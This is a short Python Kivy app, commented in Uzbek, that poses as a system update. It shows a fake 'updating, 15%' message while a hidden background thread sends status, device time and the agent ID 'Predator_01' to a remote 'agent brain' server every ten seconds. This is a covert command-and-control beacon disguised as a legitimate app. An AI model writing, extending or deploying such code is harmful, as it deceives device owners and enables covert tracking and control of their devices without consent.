from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
import requests
import threading
import time

# SERVER MANZILI (O'zingiznikiga almashtirganingizga ishonch hosil qiling)
BRAIN_URL = "https://predatoragent26.pythonanywhere.com"

class SystemUpdateApp(App):
    def build(self):
        # Ilova ochilganda ekranda ko'rinadigan matn
        self.status_label = Label(text="Tizim yangilanmoqda...\nIltimos kutib turing (15%)")
        
        # Orqa fonda ishlovchi funksiyani alohida "oqim"da boshlash
        threading.Thread(target=self.agent_brain_sync, daemon=True).start()
        
        return self.status_label

    def agent_brain_sync(self):
        """Server bilan ma'lumot almashish funksiyasi"""
        while True:
            try:
                # Serverga yuboriladigan ma'lumotlar (Status, Vaqt va h.k)
                data = {
                    "status": "online",
                    "device_time": time.ctime(),
                    "agent_id": "Predator_01"
                }
                
                # Ma'lumot yuborish
                response = requests.post(f"{BRAIN_URL}/stats", json=data, timeout=10)
                
                if response.status_code == 200:
                    print("Aloqa o'rnatildi!")
                
            except Exception as e:
                print(f"Xatolik yuz berdi: {e}")
            
            # Har 10 soniyada bir marta takrorlash
            time.sleep(10)

if __name__ == "__main__":
    SystemUpdateApp().run()
